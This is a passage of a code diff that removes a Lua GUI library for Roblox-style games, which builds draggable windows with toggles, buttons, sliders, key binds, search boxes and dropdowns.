@@ -1,1101 +1,1087 @@
 local library = {count = 0, queue = {}, callbacks = {}, rainbowtable = {}, toggled = true, binds = {}};
 local defaults; do
-    local dragger = {}; do
-        local mouse        = game:GetService("Players").LocalPlayer:GetMouse();
-        local inputService = game:GetService('UserInputService');
-        local heartbeat    = game:GetService("RunService").Heartbeat;
-        -- // credits to Ririchi / Inori for this cute drag function :)
-        function dragger.new(frame)
-            local s, event = pcall(function()
-                return frame.MouseEnter
-            end)
-    
-            if s then
-                frame.Active = true;
-                
-                event:connect(function()
-                    local input = frame.InputBegan:connect(function(key)
-                        if key.UserInputType == Enum.UserInputType.MouseButton1 then
-                            local objectPosition = Vector2.new(mouse.X - frame.AbsolutePosition.X, mouse.Y - frame.AbsolutePosition.Y);
-                            while heartbeat:wait() and inputService:IsMouseButtonPressed(Enum.UserInputType.MouseButton1) do
-                                pcall(function()
-                                    frame:TweenPosition(UDim2.new(0, mouse.X - objectPosition.X + (frame.Size.X.Offset * frame.AnchorPoint.X), 0, mouse.Y - objectPosition.Y + (frame.Size.Y.Offset * frame.AnchorPoint.Y)), 'Out', 'Linear', 0.1, true);
-                                end)
-                            end
-                        end
-                    end)
-    
-                    local leave;
-                    leave = frame.MouseLeave:connect(function()
-                        input:disconnect();
-                        leave:disconnect();
-                    end)
-                end)
-            end
-        end
-
-        game:GetService('UserInputService').InputBegan:connect(function(key, gpe)
-            if (not gpe) then
-                if key.KeyCode == Enum.KeyCode.RightControl then
-                    library.toggled = not library.toggled;
-                    for i, data in next, library.queue do
-                        local pos = (library.toggled and data.p or UDim2.new(-1, 0, -0.5,0))
-                        data.w:TweenPosition(pos, (library.toggled and 'Out' or 'In'), 'Quad', 0.15, true)
-                        wait();
-                    end
-                end
-            end
-        end)
-    end
-    
-    local types = {}; do
-        types.__index = types;
-        function types.window(name, options)
-            library.count = library.count + 1
-            local newWindow = library:Create('Frame', {
-                Name = name;
-                Size = UDim2.new(0, 190, 0, 30);
-                BackgroundColor3 = options.topcolor;
-                BorderSizePixel = 0;
-                Parent = library.container;
-                Position = UDim2.new(0, (15 + (200 * library.count) - 200), 0, 0);
-                ZIndex = 3;
-                library:Create('TextLabel', {
-                    Text = name;
-                    Size = UDim2.new(1, -10, 1, 0);
-                    Position = UDim2.new(0, 5, 0, 0);
-                    BackgroundTransparency = 1;
-                    Font = Enum.Font.Code;
-                    TextSize = options.titlesize;
-                    Font = options.titlefont;
-                    TextColor3 = options.titletextcolor;
-                    TextStrokeTransparency = library.options.titlestroke;
-                    TextStrokeColor3 = library.options.titlestrokecolor;
-                    ZIndex = 3;
-                });
-                library:Create("TextButton", {
-                    Size = UDim2.new(0, 30, 0, 30);
-                    Position = UDim2.new(1, -35, 0, 0);
-                    BackgroundTransparency = 1;
-                    Text = "-";
-                    TextSize = options.titlesize;
-                    Font = options.titlefont;--Enum.Font.Code;
-                    Name = 'window_toggle';
-                    TextColor3 = options.titletextcolor;
-                    TextStrokeTransparency = library.options.titlestroke;
-                    TextStrokeColor3 = library.options.titlestrokecolor;
-                    ZIndex = 3;
-                });
-                library:Create("Frame", {
-                    Name = 'Underline';
-                    Size = UDim2.new(1, 0, 0, 2);
-                    Position = UDim2.new(0, 0, 1, -2);
-                    BackgroundColor3 = (options.underlinecolor ~= "rainbow" and options.underlinecolor or Color3.new());
-                    BorderSizePixel = 0;
-                    ZIndex = 3;
-                });
-                library:Create('Frame', {
-                    Name = 'container';
-                    Position = UDim2.new(0, 0, 1, 0);
-                    Size = UDim2.new(1, 0, 0, 0);
-                    BorderSizePixel = 0;
-                    BackgroundColor3 = options.bgcolor;
-                    ClipsDescendants = false;
-                    library:Create('UIListLayout', {
-                        Name = 'List';
-                        SortOrder = Enum.SortOrder.LayoutOrder;
-                    })
-                });
-            })
-            
-            if options.underlinecolor == "rainbow" then
-                table.insert(library.rainbowtable, newWindow:FindFirstChild('Underline'))
-            end
-
-            local window = setmetatable({
-                count = 0;
-                object = newWindow;
-                container = newWindow.container;
-                toggled = true;
-                flags   = {};
-
-            }, types)
-
-            table.insert(library.queue, {
-                w = window.object;
-                p = window.object.Position;
-            })
-
-            newWindow:FindFirstChild("window_toggle").MouseButton1Click:connect(function()
-                window.toggled = not window.toggled;
-                newWindow:FindFirstChild("window_toggle").Text = (window.toggled and "+" or "-")
-                if (not window.toggled) then
-                    window.container.ClipsDescendants = true;
-                end
-                wait();
-                local y = 0;
-                for i, v in next, window.container:GetChildren() do
-                    if (not v:IsA('UIListLayout')) then
-                        y = y + v.AbsoluteSize.Y;
-                    end
-                end 
-
-                local targetSize = window.toggled and UDim2.new(1, 0, 0, y+5) or UDim2.new(1, 0, 0, 0);
-                local targetDirection = window.toggled and "In" or "Out"
-
-                window.container:TweenSize(targetSize, targetDirection, "Quad", 0.15, true)
-                wait(.15)
-                if window.toggled then
-                    window.container.ClipsDescendants = false;
-                end
-            end)
-
-            return window;
-        end
-        
-        function types:Resize()
-            local y = 0;
-            for i, v in next, self.container:GetChildren() do
-                if (not v:IsA('UIListLayout')) then
-                    y = y + v.AbsoluteSize.Y;
-                end
-            end 
-            self.container.Size = UDim2.new(1, 0, 0, y+5)
-        end
-        
-        function types:GetOrder() 
-            local c = 0;
-            for i, v in next, self.container:GetChildren() do
-                if (not v:IsA('UIListLayout')) then
-                    c = c + 1
-                end
-            end
-            return c
-        end
-        
-        function types:Label(text)
-            local v = game:GetService'TextService':GetTextSize(text, 18, Enum.Font.SourceSans, Vector2.new(math.huge, math.huge))
-            local object = library:Create('Frame', {
-                Size = UDim2.new(1, 0, 0, v.Y + 5);
-                BackgroundTransparency  = 1;
-                library:Create('TextLabel', {
-                    Size = UDim2.new(1, 0, 1, 0);
-                    Position = UDim2.new(0, 10, 0, 0);
-                    LayoutOrder = self:GetOrder();
-
-                    Text = text;
-                    TextSize = 18;
-                    Font = Enum.Font.SourceSans;
-                    TextColor3 = Color3.fromRGB(255, 255, 255);
-                    BackgroundTransparency = 1;
-                    TextXAlignment = Enum.TextXAlignment.Left;
-                    TextWrapped = true;
-                });
-                Parent = self.container
-            })
-            self:Resize();
-        end
-
-        function types:Toggle(name, options, callback)
-            local default  = options.default or false;
-            local location = options.location or self.flags;
-            local flag     = options.flag or "";
-            local callback = callback or function() end;
-            
-            location[flag] = default;
-
-            local check = library:Create('Frame', {
-                BackgroundTransparency = 1;
-                Size = UDim2.new(1, 0, 0, 25);
-                LayoutOrder = self:GetOrder();
-                library:Create('TextLabel', {
-                    Name = name;
-                    Text = "\r" .. name;
-                    BackgroundTransparency = 1;
-                    TextColor3 = library.options.textcolor;
-                    Position = UDim2.new(0, 5, 0, 0);
-                    Size     = UDim2.new(1, -5, 1, 0);
-                    TextXAlignment = Enum.TextXAlignment.Left;
-                    Font = library.options.font;
-                    TextSize = library.options.fontsize;
-                    TextStrokeTransparency = library.options.textstroke;
-                    TextStrokeColor3 = library.options.strokecolor;
-                    library:Create('TextButton', {
-                        Text = (location[flag] and utf8.char(10003) or "");
-                        Font = library.options.font;
-                        TextSize = library.options.fontsize;
-                        Name = 'Checkmark';
-                        Size = UDim2.new(0, 20, 0, 20);
-                        Position = UDim2.new(1, -25, 0, 4);
-                        TextColor3 = library.options.textcolor;
-                        BackgroundColor3 = library.options.bgcolor;
-                        BorderColor3 = library.options.bordercolor;
-                        TextStrokeTransparency = library.options.textstroke;
-                        TextStrokeColor3 = library.options.strokecolor;
-                    })
-                });
-                Parent = self.container;
-            });
-                
-            local function click(t)
-                location[flag] = not location[flag];
-                check:FindFirstChild(name).Checkmark.Text = location[flag] and utf8.char(10003) or "";
-                callback(location[flag])
-            end
-
-            check:FindFirstChild(name).Checkmark.MouseButton1Click:connect(click)
-            library.callbacks[flag] = click;
-
-            if location[flag] == true then
-                callback(location[flag])
-            end
-
-            self:Resize();
-            return {
-                Set = function(self, b)
-                    location[flag] = b;
-                    callback(location[flag])
-                    check:FindFirstChild(name).Checkmark.Text = location[flag] and utf8.char(10003) or "";
-                end
-            }
-        end
-        
-        function types:Button(name, callback)
-            callback = callback or function() end;
-            
-            local check = library:Create('Frame', {
-                BackgroundTransparency = 1;
-                Size = UDim2.new(1, 0, 0, 25);
-                LayoutOrder = self:GetOrder();
-                library:Create('TextButton', {
-                    Name = name;
-                    Text = name;
-                    BackgroundColor3 = library.options.btncolor;
-                    BorderColor3 = library.options.bordercolor;
-                    TextStrokeTransparency = library.options.textstroke;
-                    TextStrokeColor3 = library.options.strokecolor;
-                    TextColor3 = library.options.textcolor;
-                    Position = UDim2.new(0, 5, 0, 5);
-                    Size     = UDim2.new(1, -10, 0, 20);
-                    Font = library.options.font;
-                    TextSize = library.options.fontsize;
-                });
-                Parent = self.container;
-            });
-            
-            check:FindFirstChild(name).MouseButton1Click:connect(callback)
-            self:Resize();
-
-            return {
-                Fire = function()
-                    callback();
-                end
-            }
-        end
-        
-        function types:Box(name, options, callback) --type, default, data, location, flag)
-            local type   = options.type or "";
-            local default = options.default or "";
-            local data = options.data
-            local location = options.location or self.flags;
-            local flag     = options.flag or "";
-            local callback = callback or function() end;
-            local min      = options.min or 0;
-            local max      = options.max or 9e9;
-
-            if type == 'number' and (not tonumber(default)) then
-                location[flag] = default;
-            else
-                location[flag] = "";
-                default = "";
-            end
-
-            local check = library:Create('Frame', {
-                BackgroundTransparency = 1;
-                Size = UDim2.new(1, 0, 0, 25);
-                LayoutOrder = self:GetOrder();
-                library:Create('TextLabel', {
-                    Name = name;
-                    Text = "\r" .. name;
-                    BackgroundTransparency = 1;
-                    TextColor3 = library.options.textcolor;
-                    TextStrokeTransparency = library.options.textstroke;
-                    TextStrokeColor3 = library.options.strokecolor;
-                    Position = UDim2.new(0, 5, 0, 0);
-                    Size     = UDim2.new(1, -5, 1, 0);
-                    TextXAlignment = Enum.TextXAlignment.Left;
-                    Font = library.options.font;
-                    TextSize = library.options.fontsize;
-                    library:Create('TextBox', {
-                        TextStrokeTransparency = library.options.textstroke;
-                        TextStrokeColor3 = library.options.strokecolor;
-                        Text = tostring(default);
-                        Font = library.options.font;
-                        TextSize = library.options.fontsize;
-                        Name = 'Box';
-                        Size = UDim2.new(0, 60, 0, 20);
-                        Position = UDim2.new(1, -65, 0, 3);
-                        TextColor3 = library.options.textcolor;
-                        BackgroundColor3 = library.options.boxcolor;
-                        BorderColor3 = library.options.bordercolor;
-                        PlaceholderColor3 = library.options.placeholdercolor;
-                    })
-                });
-                Parent = self.container;
-            });
-        
-            local box = check:FindFirstChild(name):FindFirstChild('Box');
-            box.FocusLost:connect(function(e)
-                local old = location[flag];
-                if type == "number" then
-                    local num = tonumber(box.Text)
-                    if (not num) then
-                        box.Text = tonumber(location[flag])
-                    else
-                        location[flag] = math.clamp(num, min, max)
-                        box.Text = tonumber(location[flag])
-                    end
-                else
-                    location[flag] = tostring(box.Text)
-                end
-
-                callback(location[flag], old, e)
-            end)
-            
-            if type == 'number' then
-                box:GetPropertyChangedSignal('Text'):connect(function()
-                    box.Text = string.gsub(box.Text, "[%a+]", "");
-                end)
-            end
-            
-            self:Resize();
-            return box
-        end
-        
-        function types:Bind(name, options, callback)
-            local location     = options.location or self.flags;
-            local keyboardOnly = options.kbonly or false
-            local flag         = options.flag or "";
-            local callback     = callback or function() end;
-            local default      = options.default;
-
-            if keyboardOnly and (not tostring(default):find('MouseButton')) then
-                location[flag] = default
-            end
-            
-            local banned = {
-                Return = true;
-                Space = true;
-                Tab = true;
-                Unknown = true;
-            }
-            
-            local shortNames = {
-                RightControl = 'RightCtrl';
-                LeftControl = 'LeftCtrl';
-                LeftShift = 'LShift';
-                RightShift = 'RShift';
-                MouseButton1 = "Mouse1";
-                MouseButton2 = "Mouse2";
-            }
-            
-            local allowed = {
-                MouseButton1 = true;
-                MouseButton2 = true;
-            }      
-
-            local nm = (default and (shortNames[default.Name] or default.Name) or "None");
-            local check = library:Create('Frame', {
-                BackgroundTransparency = 1;
-                Size = UDim2.new(1, 0, 0, 30);
-                LayoutOrder = self:GetOrder();
-                library:Create('TextLabel', {
-                    Name = name;
-                    Text = "\r" .. name;
-                    BackgroundTransparency = 1;
-                    TextColor3 = library.options.textcolor;
-                    Position = UDim2.new(0, 5, 0, 0);
-                    Size     = UDim2.new(1, -5, 1, 0);
-                    TextXAlignment = Enum.TextXAlignment.Left;
-                    Font = library.options.font;
-                    TextSize = library.options.fontsize;
-                    TextStrokeTransparency = library.options.textstroke;
-                    TextStrokeColor3 = library.options.strokecolor;
-                    BorderColor3     = library.options.bordercolor;
-                    BorderSizePixel  = 1;
-                    library:Create('TextButton', {
-                        Name = 'Keybind';
-                        Text = nm;
-                        TextStrokeTransparency = library.options.textstroke;
-                        TextStrokeColor3 = library.options.strokecolor;
-                        Font = library.options.font;
-                        TextSize = library.options.fontsize;
-                        Size = UDim2.new(0, 60, 0, 20);
-                        Position = UDim2.new(1, -65, 0, 5);
-                        TextColor3 = library.options.textcolor;
-                        BackgroundColor3 = library.options.bgcolor;
-                        BorderColor3     = library.options.bordercolor;
-                        BorderSizePixel  = 1;
-                    })
-                });
-                Parent = self.container;
-            });
-             
-            local button = check:FindFirstChild(name).Keybind;
-            button.MouseButton1Click:connect(function()
-                library.binding = true
-
-                button.Text = "..."
-                local a, b = game:GetService('UserInputService').InputBegan:wait();
-                local name = tostring(a.KeyCode.Name);
-                local typeName = tostring(a.UserInputType.Name);
-
-                if (a.UserInputType ~= Enum.UserInputType.Keyboard and (allowed[a.UserInputType.Name]) and (not keyboardOnly)) or (a.KeyCode and (not banned[a.KeyCode.Name])) then
-                    local name = (a.UserInputType ~= Enum.UserInputType.Keyboard and a.UserInputType.Name or a.KeyCode.Name);
-                    location[flag] = (a);
-                    button.Text = shortNames[name] or name;
-                    
-                else
-                    if (location[flag]) then
-                        if (not pcall(function()
-                            return location[flag].UserInputType
-                        end)) then
-                            local name = tostring(location[flag])
-                            button.Text = shortNames[name] or name
-                        else
-                            local name = (location[flag].UserInputType ~= Enum.UserInputType.Keyboard and location[flag].UserInputType.Name or location[flag].KeyCode.Name);
-                            button.Text = shortNames[name] or name;
-                        end
-                    end
-                end
-
-                wait(0.1)  
-                library.binding = false;
-            end)
-            
-            if location[flag] then
-                button.Text = shortNames[tostring(location[flag].Name)] or tostring(location[flag].Name)
-            end
-
-            library.binds[flag] = {
-                location = location;
-                callback = callback;
-            };
-
-            self:Resize();
-        end
-    
-        function types:Section(name)
-            local order = self:GetOrder();
-            local determinedSize = UDim2.new(1, 0, 0, 25)
-            local determinedPos = UDim2.new(0, 0, 0, 4);
-            local secondarySize = UDim2.new(1, 0, 0, 20);
-                        
-            if order == 0 then
-                determinedSize = UDim2.new(1, 0, 0, 21)
-                determinedPos = UDim2.new(0, 0, 0, -1);
-                secondarySize = nil
-            end
-            
-            local check = library:Create('Frame', {
-                Name = 'Section';
-                BackgroundTransparency = 1;
-                Size = determinedSize;
-                BackgroundColor3 = library.options.sectncolor;
-                BorderSizePixel = 0;
-                LayoutOrder = order;
-                library:Create('TextLabel', {
-                    Name = 'section_lbl';
-                    Text = name;
-                    BackgroundTransparency = 0;
-                    BorderSizePixel = 0;
-                    BackgroundColor3 = library.options.sectncolor;
-                    TextColor3 = library.options.textcolor;
-                    Position = determinedPos;
-                    Size     = (secondarySize or UDim2.new(1, 0, 1, 0));
-                    Font = library.options.font;
-                    TextSize = library.options.fontsize;
-                    TextStrokeTransparency = library.options.textstroke;
-                    TextStrokeColor3 = library.options.strokecolor;
-                });
-                Parent = self.container;
-            });
-        
-            self:Resize();
-        end
-
-        function types:Slider(name, options, callback)
-            local default = options.default or options.min;
-            local min     = options.min or 0;
-            local max      = options.max or 1;
-            local location = options.location or self.flags;
-            local precise  = options.precise  or false -- e.g 0, 1 vs 0, 0.1, 0.2, ...
-            local flag     = options.flag or "";
-            local callback = callback or function() end
-
-            location[flag] = default;
-
-            local check = library:Create('Frame', {
-                BackgroundTransparency = 1;
-                Size = UDim2.new(1, 0, 0, 25);
-                LayoutOrder = self:GetOrder();
-                library:Create('TextLabel', {
-                    Name = name;
-                    TextStrokeTransparency = library.options.textstroke;
-                    TextStrokeColor3 = library.options.strokecolor;
-                    Text = "\r" .. name;
-                    BackgroundTransparency = 1;
-                    TextColor3 = library.options.textcolor;
-                    Position = UDim2.new(0, 5, 0, 2);
-                    Size     = UDim2.new(1, -5, 1, 0);
-                    TextXAlignment = Enum.TextXAlignment.Left;
-                    Font = library.options.font;
-                    TextSize = library.options.fontsize;
-                    library:Create('Frame', {
-                        Name = 'Container';
-                        Size = UDim2.new(0, 60, 0, 20);
-                        Position = UDim2.new(1, -65, 0, 3);
-                        BackgroundTransparency = 1;
-                        --BorderColor3 = library.options.bordercolor;
-                        BorderSizePixel = 0;
-                        library:Create('TextLabel', {
-                            Name = 'ValueLabel';
-                            Text = default;
-                            BackgroundTransparency = 1;
-                            TextColor3 = library.options.textcolor;
-                            Position = UDim2.new(0, -10, 0, 0);
-                            Size     = UDim2.new(0, 1, 1, 0);
-                            TextXAlignment = Enum.TextXAlignment.Right;
-                            Font = library.options.font;
-                            TextSize = library.options.fontsize;
-                            TextStrokeTransparency = library.options.textstroke;
-                            TextStrokeColor3 = library.options.strokecolor;
-                        });
-                        library:Create('TextButton', {
-                            Name = 'Button';
-                            Size = UDim2.new(0, 5, 1, -2);
-                            Position = UDim2.new(0, 0, 0, 1);
-                            AutoButtonColor = false;
-                            Text = "";
-                            BackgroundColor3 = Color3.fromRGB(20, 20, 20);
-                            BorderSizePixel = 0;
-                            ZIndex = 2;
-                            TextStrokeTransparency = library.options.textstroke;
-                            TextStrokeColor3 = library.options.strokecolor;
-                        });
-                        library:Create('Frame', {
-                            Name = 'Line';
-                            BackgroundTransparency = 0;
-                            Position = UDim2.new(0, 0, 0.5, 0);
-                            Size     = UDim2.new(1, 0, 0, 1);
-                            BackgroundColor3 = Color3.fromRGB(255, 255, 255);
-                            BorderSizePixel = 0;
-                        });
-                    })
-                });
-                Parent = self.container;
-            });
-
-            local overlay = check:FindFirstChild(name);
-
-            local renderSteppedConnection;
-            local inputBeganConnection;
-            local inputEndedConnection;
-            local mouseLeaveConnection;
-            local mouseDownConnection;
-            local mouseUpConnection;
-
-            check:FindFirstChild(name).Container.MouseEnter:connect(function()
-                local function update()
-                    if renderSteppedConnection then renderSteppedConnection:disconnect() end 
-                    
-
-                    renderSteppedConnection = game:GetService('RunService').RenderStepped:connect(function()
-                        local mouse = game:GetService("UserInputService"):GetMouseLocation()
-                        local percent = (mouse.X - overlay.Container.AbsolutePosition.X) / (overlay.Container.AbsoluteSize.X)
-                        percent = math.clamp(percent, 0, 1)
-                        percent = tonumber(string.format("%.2f", percent))
-
-                        overlay.Container.Button.Position = UDim2.new(math.clamp(percent, 0, 0.99), 0, 0, 1)
-                        
-                        local num = min + (max - min) * percent
-                        local value = (precise and num or math.floor(num))
-
-                        overlay.Container.ValueLabel.Text = value;
-                        callback(tonumber(value))
-                        location[flag] = tonumber(value)
-                    end)
-                end
-
-                local function disconnect()
-                    if renderSteppedConnection then renderSteppedConnection:disconnect() end
-                    if inputBeganConnection then inputBeganConnection:disconnect() end
-                    if inputEndedConnection then inputEndedConnection:disconnect() end
-                    if mouseLeaveConnection then mouseLeaveConnection:disconnect() end
-                    if mouseUpConnection then mouseUpConnection:disconnect() end
-                end
-
-                inputBeganConnection = check:FindFirstChild(name).Container.InputBegan:connect(function(input)
-                    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-                        update()
-                    end
-                end)
-
-                inputEndedConnection = check:FindFirstChild(name).Container.InputEnded:connect(function(input)
-                    if input.UserInputType == Enum.UserInputType.MouseButton1 then
-                        disconnect()
-                    end
-                end)
-
-                mouseDownConnection = check:FindFirstChild(name).Container.Button.MouseButton1Down:connect(update)
-                mouseUpConnection   = game:GetService("UserInputService").InputEnded:connect(function(a, b)
-                    if a.UserInputType == Enum.UserInputType.MouseButton1 and (mouseDownConnection.Connected) then
-                        disconnect()
-                    end
-                end)
-            end)    
-
-            if default ~= min then
-                local percent = 1 - ((max - default) / (max - min))
-                local number  = default 
-
-                number = tonumber(string.format("%.2f", number))
-                if (not precise) then
-                    number = math.floor(number)
-                end
-
-                overlay.Container.Button.Position  = UDim2.new(math.clamp(percent, 0, 0.99), 0,  0, 1) 
-                overlay.Container.ValueLabel.Text  = number
-            end
-
-            self:Resize();
-            return {
-                Set = function(self, value)
-                    local percent = 1 - ((max - value) / (max - min))
-                    local number  = value 
-
-                    number = tonumber(string.format("%.2f", number))
-                    if (not precise) then
-                        number = math.floor(number)
-                    end
-
-                    overlay.Container.Button.Position  = UDim2.new(math.clamp(percent, 0, 0.99), 0,  0, 1) 
-                    overlay.Container.ValueLabel.Text  = number
-                    location[flag] = number
-                    callback(number)
-                end
-            }
-        end 
-
-        function types:SearchBox(text, options, callback)
-            local list = options.list or {};
-            local flag = options.flag or "";
-            local location = options.location or self.flags;
-            local callback = callback or function() end;
-
-            local busy = false;
-            local box = library:Create('Frame', {
-                BackgroundTransparency = 1;
-                Size = UDim2.new(1, 0, 0, 25);
-                LayoutOrder = self:GetOrder();
-                library:Create('TextBox', {
-                    Text = "";
-                    PlaceholderText = text;
-                    PlaceholderColor3 = Color3.fromRGB(60, 60, 60);
-                    Font = library.options.font;
-                    TextSize = library.options.fontsize;
-                    Name = 'Box';
-                    Size = UDim2.new(1, -10, 0, 20);
-                    Position = UDim2.new(0, 5, 0, 4);
-                    TextColor3 = library.options.textcolor;
-                    BackgroundColor3 = library.options.dropcolor;
-                    BorderColor3 = library.options.bordercolor;
-                    TextStrokeTransparency = library.options.textstroke;
-                    TextStrokeColor3 = library.options.strokecolor;
-                    library:Create('ScrollingFrame', {
-                        Position = UDim2.new(0, 0, 1, 1);
-                        Name = 'Container';
-                        BackgroundColor3 = library.options.btncolor;
-                        ScrollBarThickness = 0;
-                        BorderSizePixel = 0;
-                        BorderColor3 = library.options.bordercolor;
-                        Size = UDim2.new(1, 0, 0, 0);
-                        library:Create('UIListLayout', {
-                            Name = 'ListLayout';
-                            SortOrder = Enum.SortOrder.LayoutOrder;
-                        });
-                        ZIndex = 2;
-                    });
-                });
-                Parent = self.container;
-            })
-
-            local function rebuild(text)
-                box:FindFirstChild('Box').Container.ScrollBarThickness = 0
-                for i, child in next, box:FindFirstChild('Box').Container:GetChildren() do
-                    if (not child:IsA('UIListLayout')) then
-                        child:Destroy();
-                    end
-                end
-
-                if #text > 0 then
-                    for i, v in next, list do
-                        if string.sub(string.lower(v), 1, string.len(text)) == string.lower(text) then
-                            local button = library:Create('TextButton', {
-                                Text = v;
-                                Font = library.options.font;
-                                TextSize = library.options.fontsize;
-                                TextColor3 = library.options.textcolor;
-                                BorderColor3 = library.options.bordercolor;
-                                TextStrokeTransparency = library.options.textstroke;
-                                TextStrokeColor3 = library.options.strokecolor;
-                                Parent = box:FindFirstChild('Box').Container;
-                                Size = UDim2.new(1, 0, 0, 20);
-                                LayoutOrder = i;
-                                BackgroundColor3 = library.options.btncolor;
-                                ZIndex = 2;
-                            })
-
-                            button.MouseButton1Click:connect(function()
-                                busy = true;
-                                box:FindFirstChild('Box').Text = button.Text;
-                                wait();
-                                busy = false;
-
-                                location[flag] = button.Text;
-                                callback(location[flag])
-
-                                box:FindFirstChild('Box').Container.ScrollBarThickness = 0
-                                for i, child in next, box:FindFirstChild('Box').Container:GetChildren() do
-                                    if (not child:IsA('UIListLayout')) then
-                                        child:Destroy();
-                                    end
-                                end
-                                box:FindFirstChild('Box').Container:TweenSize(UDim2.new(1, 0, 0, 0), 'Out', 'Quad', 0.25, true)
-                            end)
-                        end
-                    end
-                end
-
-                local c = box:FindFirstChild('Box').Container:GetChildren()
-                local ry = (20 * (#c)) - 20
-
-                local y = math.clamp((20 * (#c)) - 20, 0, 100)
-                if ry > 100 then
-                    box:FindFirstChild('Box').Container.ScrollBarThickness = 5;
-                end
-
-                box:FindFirstChild('Box').Container:TweenSize(UDim2.new(1, 0, 0, y), 'Out', 'Quad', 0.25, true)
-                box:FindFirstChild('Box').Container.CanvasSize = UDim2.new(1, 0, 0, (20 * (#c)) - 20)
-            end
-
-            box:FindFirstChild('Box'):GetPropertyChangedSignal('Text'):connect(function()
-                if (not busy) then
-                    rebuild(box:FindFirstChild('Box').Text)
-                end
-            end);
-
-            local function reload(new_list)
-                list = new_list;
-                rebuild("")
-            end
-            self:Resize();
-            return reload, box:FindFirstChild('Box');
-        end
-        
-        function types:Dropdown(name, options, callback)
-            local location = options.location or self.flags;
-            local flag = options.flag or "";
-            local callback = callback or function() end;
-            local list = options.list or {};
-
-            location[flag] = list[1]
-            local check = library:Create('Frame', {
-                BackgroundTransparency = 1;
-                Size = UDim2.new(1, 0, 0, 25);
-                BackgroundColor3 = Color3.fromRGB(25, 25, 25);
-                BorderSizePixel = 0;
-                LayoutOrder = self:GetOrder();
-                library:Create('Frame', {
-                    Name = 'dropdown_lbl';
-                    BackgroundTransparency = 0;
-                    BackgroundColor3 = library.options.dropcolor;
-                    Position = UDim2.new(0, 5, 0, 4);
-                    BorderColor3 = library.options.bordercolor;
-                    Size     = UDim2.new(1, -10, 0, 20);
-                    library:Create('TextLabel', {
-                        Name = 'Selection';
-                        Size = UDim2.new(1, 0, 1, 0);
-                        Text = list[1];
-                        TextColor3 = library.options.textcolor;
-                        BackgroundTransparency = 1;
-                        Font = library.options.font;
-                        TextSize = library.options.fontsize;
-                        TextStrokeTransparency = library.options.textstroke;
-                        TextStrokeColor3 = library.options.strokecolor;
-                    });
-                    library:Create("TextButton", {
-                        Name = 'drop';
-                        BackgroundTransparency = 1;
-                        Size = UDim2.new(0, 20, 1, 0);
-                        Position = UDim2.new(1, -25, 0, 0);
-                        Text = 'v';
-                        TextColor3 = library.options.textcolor;
-                        Font = library.options.font;
-                        TextSize = library.options.fontsize;
-                        TextStrokeTransparency = library.options.textstroke;
-                        TextStrokeColor3 = library.options.strokecolor;
-                    })
-                });
-                Parent = self.container;
-            });
-            
-            local button = check:FindFirstChild('dropdown_lbl').drop;
-            local input;
-            
-            button.MouseButton1Click:connect(function()
-                if (input and input.Connected) then
-                    return
-                end 
-                
-                check:FindFirstChild('dropdown_lbl'):WaitForChild('Selection').TextColor3 = Color3.fromRGB(60, 60, 60);
-                check:FindFirstChild('dropdown_lbl'):WaitForChild('Selection').Text = name;
-                local c = 0;
-                for i, v in next, list do
-                    c = c + 20;
-                end
-
-                local size = UDim2.new(1, 0, 0, c)
-
-                local clampedSize;
-                local scrollSize = 0;
-                if size.Y.Offset > 100 then
-                    clampedSize = UDim2.new(1, 0, 0, 100)
-                    scrollSize = 5;
-                end
-                
-                local goSize = (clampedSize ~= nil and clampedSize) or size;    
-                local container = library:Create('ScrollingFrame', {
-                    TopImage = 'rbxasset://textures/ui/Scroll/scroll-middle.png';
-                    BottomImage = 'rbxasset://textures/ui/Scroll/scroll-middle.png';
-                    Name = 'DropContainer';
-                    Parent = check:FindFirstChild('dropdown_lbl');
-                    Size = UDim2.new(1, 0, 0, 0);
-                    BackgroundColor3 = library.options.bgcolor;
-                    BorderColor3 = library.options.bordercolor;
-                    Position = UDim2.new(0, 0, 1, 0);
-                    ScrollBarThickness = scrollSize;
-                    CanvasSize = UDim2.new(0, 0, 0, size.Y.Offset);
-                    ZIndex = 5;
-                    ClipsDescendants = true;
-                    library:Create('UIListLayout', {
-                        Name = 'List';
-                        SortOrder = Enum.SortOrder.LayoutOrder
-                    })
-                })
-
-                for i, v in next, list do
-                    local btn = library:Create('TextButton', {
-                        Size = UDim2.new(1, 0, 0, 20);
-                        BackgroundColor3 = library.options.btncolor;
-                        BorderColor3 = library.options.bordercolor;
-                        Text = v;
-                        Font = library.options.font;
-                        TextSize = library.options.fontsize;
-                        LayoutOrder = i;
-                        Parent = container;
-                        ZIndex = 5;
-                        TextColor3 = library.options.textcolor;
-                        TextStrokeTransparency = library.options.textstroke;
-                        TextStrokeColor3 = library.options.strokecolor;
-                    })
-                    
-                    btn.MouseButton1Click:connect(function()
-                        check:FindFirstChild('dropdown_lbl'):WaitForChild('Selection').TextColor3 = library.options.textcolor
-                        check:FindFirstChild('dropdown_lbl'):WaitForChild('Selection').Text = btn.Text;
-
-                        location[flag] = tostring(btn.Text);
-                        callback(location[flag])
-
-                        game:GetService('Debris'):AddItem(container, 0)
-                        input:disconnect();
-                    end)
-                end
-                
-                container:TweenSize(goSize, 'Out', 'Quad', 0.15, true)
-                
-                local function isInGui(frame)
-                    local mloc = game:GetService('UserInputService'):GetMouseLocation();
-                    local mouse = Vector2.new(mloc.X, mloc.Y - 36);
-                    
-                    local x1, x2 = frame.AbsolutePosition.X, frame.AbsolutePosition.X + frame.AbsoluteSize.X;
-                    local y1, y2 = frame.AbsolutePosition.Y, frame.AbsolutePosition.Y + frame.AbsoluteSize.Y;
-                
-                    return (mouse.X >= x1 and mouse.X <= x2) and (mouse.Y >= y1 and mouse.Y <= y2)
-                end
-                
-                input = game:GetService('UserInputService').InputBegan:connect(function(a)
-                    if a.UserInputType == Enum.UserInputType.MouseButton1 and (not isInGui(container)) then
-                        check:FindFirstChild('dropdown_lbl'):WaitForChild('Selection').TextColor3 = library.options.textcolor
-                        check:FindFirstChild('dropdown_lbl'):WaitForChild('Selection').Text       = location[flag];
-
-                        container:TweenSize(UDim2.new(1, 0, 0, 0), 'In', 'Quad', 0.15, true)
-                        wait(0.15)
-
-                        game:GetService('Debris'):AddItem(container, 0)
-                        input:disconnect();
-                    end
-                end)
-            end)
-            
-            self:Resize();
-            local function reload(self, array)
-                options = array;
-                location[flag] = array[1];
-                pcall(function()
-                    input:disconnect()
-                end)
-                check:WaitForChild('dropdown_lbl').Selection.Text = location[flag]
-                check:FindFirstChild('dropdown_lbl'):WaitForChild('Selection').TextColor3 = library.options.textcolor
